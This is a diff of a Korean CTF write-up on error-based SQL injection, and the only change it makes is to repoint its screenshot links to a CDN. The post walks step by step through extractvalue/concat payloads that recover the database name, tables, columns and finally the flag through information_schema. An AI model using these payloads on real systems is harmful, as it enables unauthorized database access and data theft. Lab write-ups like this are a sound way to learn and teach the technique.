@@ -26,75 +26,75 @@ guid: https://s3mper.github.io/CTF-SQL-Injection-5/
 # Error Based SQL Injection
 ## START
 1. **normaltic**
-![alt text](/_image/2024-11-28-00-00-00.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-00.png?raw=true)
 1. **normaltic'**
-![alt text](/_image/2024-11-28-00-00-11.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-11.png?raw=true)
 1. **normaltic' and extractvalue('1', (concat(0x3a, 'test'))) #**
-![alt text](/_image/2024-11-28-00-00-13.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-13.png?raw=true)
 
 ## DATABASE
 1. **normaltic' and extractvalue('1', (concat(0x3a, database()))) #**
-![alt text](/_image/2024-11-28-00-00-14.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-14.png?raw=true)
 -> 💡 DB의 이름이 errSqli라는 것을 알았다
 
 ## TABLE
 1. **normaltic' and extractvalue('1', (concat(0x3a, select table_name from information_schema.tables where table_schema = 'errSqli' limit 0, 1))) #**
-![alt text](/_image/2024-11-29-00-00-00.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-29-00-00-00.png?raw=true)
 -> 👀 문법 오류가 발생했다.  
 -> 🙄 문법 오류가 왜 발생한 건지 잘 모르겠다.  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, select database()))) #**
-![alt text](/_image/2024-11-29-00-00-01.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-29-00-00-01.png?raw=true)
 -> 👀 문법 오류가 발생했다.  
 -> 👀 [위쪽](#database)에서는 SELECT를 안 쓰고 DATABASE()만 썼더니 나왔다.  
 -> 🤔 SELECT를 쓸 때는 괄호를 한 번 더 감싸줘야 하는걸까?  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select database())))) #**
-![alt text](/_image/2024-11-28-00-00-14.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-14.png?raw=true)
 -> 💡 괄호로 SELECT문을 한 번 더 감싸줬더니 결과가 나왔다.  
 -> 🤔 TABLE 이름 가져오는 것도 마찬가지고 괄호로 한 번 감싸면 될 것 같다.  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select table_name from information_schema.tables where table_schema = 'errSqli' limit 0, 1)))) #**
-![alt text](/_image/2024-11-28-00-00-15.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-15.png?raw=true)
 -> 💡 첫 번째 TABLE 이름이 flagTable이라고 한다.  
 -> 🤔 혹시 다른 TABLE이 더 있을까?  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select count(table_name) from information_schema.tables where table_schema = 'errSqli')))) #**
-![alt text](/_image/2024-11-28-00-00-16.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-16.png?raw=true)
 -> 💡 TABLE 개수가 3개라고 한다.  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select table_name from information_schema.tables where table_schema = 'errSqli' limit 1, 1)))) #**
-![alt text](/_image/2024-11-28-00-00-17.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-17.png?raw=true)
 -> 💡 두 번째 TABLE 이름은 member였다.  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select table_name from information_schema.tables where table_schema = 'errSqli' limit 2, 1)))) #**
-![alt text](/_image/2024-11-28-00-00-18.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-18.png?raw=true)
 -> 💡 두 번째 TABLE 이름은 plusFlag_Table였다.  
 -> 🤔 flagTable 먼저 확인하고 안 되면 plusFlag_Table 확인하면 될 것 같다.  
 
 ## COLUMN
 💡 이제부터는 개수 먼저 확인해야겠다.  
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select count(column_name) from information_schema.columns where table_name = 'flagTable')))) #**
-![alt text](/_image/2024-11-28-00-00-19.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-19.png?raw=true)
 -> 💡 flagTable의 컬럼 개수는 2개라고 한다.  
 -> 💡 하나씩 컬럼 이름을 확인해보겠다.  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select column_name from information_schema.columns where table_name = 'flagTable' limit 0, 1)))) **#
-![alt text](/_image/2024-11-28-00-00-01.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-01.png?raw=true)
 -> 💡 첫 번째는 idx였다.  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1)))) **#
-![alt text](/_image/2024-11-28-00-00-02.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-02.png?raw=true)
 -> 💡 두 번째는 flag였다.  
 
 ## DATA
 💡 마찬가지로 개수 먼저 확인했다.  
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select count(flag) from flagTable)))) #**
-![alt text](/_image/2024-11-28-00-00-03.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-03.png?raw=true)
 -> 💡 데이터는 총 1개이다.  
 
 1. **normaltic' and extractvalue('1', (concat(0x3a, (select flag from flagTable)))) #**
-![alt text](/_image/2024-11-28-00-00-04.png)
+![alt text](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2024-11-28-00-00-04.png?raw=true)
 -> 😎 찾았다!
 
 <div class="obsidian-links" style="display: none;">
